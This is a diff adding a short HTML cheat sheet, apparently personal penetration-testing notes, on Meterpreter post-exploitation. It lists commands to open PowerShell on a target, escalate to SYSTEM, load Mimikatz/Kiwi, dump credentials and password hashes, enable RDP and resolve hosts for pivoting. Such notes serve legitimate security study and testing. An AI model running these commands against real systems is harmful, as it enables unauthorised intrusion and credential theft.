@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>meterpreter</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>meterpreter</h1><br/><p><strong><h2>Required: Established Meterpreter Session</h2></strong><span style="text-decoration:underline;"></span></p><p><span style="text-decoration:underline;"></span></p><p><strong>Meterpterter Commands to Interact with Powershell:</strong></p><p></p><p><em><strong>load powershell	</strong></em>							:	Loads the powershell extention of meterpreter</p><p><em><strong>powershell_shell	</strong></em>							:	Starts a powershell in the target machine.</p><p></p><p></p><p></p><p><strong>For Windows Privilege Escalation</strong></p><p>run post/multi/recon/local_exploit_suggester</p><p></p><p><strong>Show Privileges</strong></p><p>getprivs</p><p></p><p><strong>Try to Escalate User to System</strong></p><p>getsystem</p><p></p><p><strong>Load Mimikatz to loot</strong></p><p>(Kiwi is the updated version of Mimikatz)</p><p>load kiwi</p><p>help</p><p><strong>To Loot Credentials</strong></p><p>creds_all</p><p></p><p><strong>Dump all the Hashes</strong></p><p>hashdump</p><p></p><p><strong>Enable RDP</strong></p><p>run post/windows/manage/enable_rdp</p><p></p><p></p><p><strong><h4>Upgrade Normal Sessions into Meterpreter Session</h4></strong></p><p></p><p>sessions -u &lt;id&gt;</p><p>eg.</p><p>sessions -u -1</p><p></p><p></p><p><strong><h3>Resolving Hostnames in a victim machine for further attack/pivoting</h3></strong></p><p></p><p></p><p><strong>resolve &lt;HOSTNAME&gt;</strong></p><p></p><p><img src="images/113-1.png" alt="images/113-1.png" /></p></div>
+</body>
+</html>
